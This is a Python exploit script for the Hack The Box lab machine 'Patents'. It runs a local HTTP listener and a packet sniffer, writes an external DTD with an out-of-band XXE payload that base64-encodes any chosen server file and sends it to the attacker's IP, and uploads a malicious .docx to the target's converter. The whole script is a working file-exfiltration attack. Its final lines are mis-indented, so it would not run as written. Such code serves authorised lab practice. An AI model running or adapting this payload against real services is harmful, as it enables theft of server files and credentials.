#!/usr/bin/env python3

##
## https://snovvcrash.rocks/2020/05/16/htb-patents-notes.html
##
##

import re
import cmd
import socket
import fcntl
import struct
from base64 import b64decode
from threading import Thread
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

# http.server.BaseHTTPRequestHandler VS http.server.SimpleHTTPRequestHandler
# socketserver.TCPServer VS http.server.HTTPServer

import requests
from scapy.all import *

M = '\033[%s;35m'  # MAGENTA
S = '\033[0m'      # RESET

URL = 'http://patents.htb/convert.php'


class SilentHTTPRequestHandler(SimpleHTTPRequestHandler):
	"""
	https://stackoverflow.com/a/3389505/6253579
	https://stackoverflow.com/a/10651257/6253579
	"""

	def log_request(self, code='-', size='-'):
		return


class HTTPServerInThread(Thread):

	def __init__(self, address='0.0.0.0', port=1337):
		super().__init__()
		self.address = address
		self.port = port
		self.httpd = TCPServer((address, port), SilentHTTPRequestHandler)

	def run(self):
		print(f'[*] Serving HTTP on {self.address} port {self.port} (http://{self.address}:{self.port}/) ...')
		self.httpd.serve_forever()


class HTTPSniffer(Thread):

	def __init__(self, iface='tun0'):
		super().__init__()
		self.iface = iface
		self.re = re.compile(r'/\?x=(\S+)')

	def run(self):
		# Wireshark filter: "http.request.method == GET && tcp.port == 1337"
		sniff(iface=self.iface, filter='tcp dst port 1337', prn=self.process_http)

	def process_http(self, pkt):
		try:
			req_text = pkt[Raw].load.decode()
			if '/?x=' in req_text:
				contents_b64 = self.re.search(req_text).group(1)
				print(b64decode(contents_b64).decode())
		except IndexError:
			pass


class Default(dict):

	def __missing__(self, key):
		return '{' + key + '}'


class Terminal(cmd.Cmd):

	prompt = f'{M%0}XXE{S}> '

	def __init__(self, proxies=None):
		super().__init__()

		self.headers = {
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate'
		}

		self.ext_dtd = """\
			<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={filename}">
			<!ENTITY % ext "<!ENTITY &#x25; exfil SYSTEM 'http://{ip}:1337/?x=%file;'>">
			%ext;
			%exfil;
		""".replace('\t', '').format_map(Default({"ip": self._get_ip()}))

		if proxies:
			self.proxies = {'http': proxies}
		else:
			self.proxies = {}

	def do_file(self, filename):
		with open('/root/htb/boxes/patents/xxe/ext.dtd', 'w') as f:
			f.write(self.ext_dtd.format(filename=filename))

		files = {
			'userfile': ('test.docx', open('/root/htb/boxes/patents/xxe/docx/malicious.docx', 'rb'), 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'),
			'submit': (None, 'Generate pdf')
		}

		resp = requests.post(URL, files=files)

	def do_EOF(self, args):
		print()
		return True

	def emptyline(self):
		pass

	def _get_ip(self, iface='tun0'):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		return socket.inet_ntoa(fcntl.ioctl(
			s.fileno(),
			0x8915,  # SIOCGIFADDR
			struct.pack('256s', iface[:15].encode())
		)[20:24])


if __name__ == '__main__':
	server = HTTPServerInThread()
	server.daemon = True
	server.start()

	sniffer = HTTPSniffer()
	sniffer.daemon = True
	sniffer.start()
  
  Terminal().cmdloop()
  
###
###
  
